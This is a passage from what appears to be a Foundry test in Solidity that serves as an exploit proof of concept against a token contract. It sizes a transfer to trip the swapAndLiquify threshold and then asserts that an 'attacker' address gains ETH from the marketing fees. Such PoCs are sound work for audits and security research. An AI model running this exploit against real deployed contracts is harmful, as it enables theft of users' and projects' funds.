        // minimumTokensBeforeSwap is 20,000,000 * 10^11
        // Marketing fee on sells is 14%
        // We need transfer * 0.14 >= 20,000,000
        // So transfer >= ~142,857,143
        // Let's try 150,000,000
        uint256 transferAmount = 150000000 * 10**11;

        console.log("Making transfer of:", transferAmount);

        // Make the transfer - this should trigger swapAndLiquify
        bool success = token.transfer(pair, transferAmount);
        require(success, "Transfer failed");

        // Give some time for swap to complete
        vm.roll(block.number + 1);

        // Check contract token balance after
        uint256 contractBalanceAfter = token.balanceOf(TARGET);
        console.log("Contract token balance after:", contractBalanceAfter);

        // Check final ETH balance
        uint256 finalEthBalance = address(attacker).balance;
        console.log("Final ETH balance:", finalEthBalance);

        // The assertion - we should have received some ETH
        assertGt(finalEthBalance, initialEthBalance, "Should receive ETH from marketing fees");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
